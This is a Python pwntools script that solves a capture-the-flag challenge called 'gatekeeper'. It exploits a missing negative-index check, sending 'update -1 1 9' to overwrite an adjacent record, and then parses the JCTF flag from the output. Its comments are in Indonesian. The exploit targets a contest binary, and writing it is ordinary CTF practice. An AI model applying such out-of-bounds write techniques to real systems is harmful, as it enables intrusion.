#!/usr/bin/env python3
from pwn import *
import re

HOST = "gatekeeper.aws.jerseyctf.com"
PORT = 31337
BINARY = "./gatekeeper_offline"

context.binary = ELF(BINARY, checksec=False)
context.log_level = "info"


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(BINARY)


def cmd(io, line: str):
    io.sendlineafter(b"gatekeeper> ", line.encode())


def main():
    io = start()

    # Bug: cmd_update hanya cek index <= 3, tidak cek index < 0.
    # index = -1 menulis ke entri Neptune (sebelum DB[1]).
    cmd(io, "update -1 1 9")
    cmd(io, "status NEPT-1070")

    out = io.recvrepeat(1.0)
    text = out.decode("utf-8", errors="ignore")
    print(text, end="")

    m = re.search(r"JCTF\{[^}]+\}", text)
    if m:
        log.success(f"FLAG: {m.group(0)}")
    else:
        log.warning("Flag belum ditemukan di output.")

    io.close()


if __name__ == "__main__":
    main()
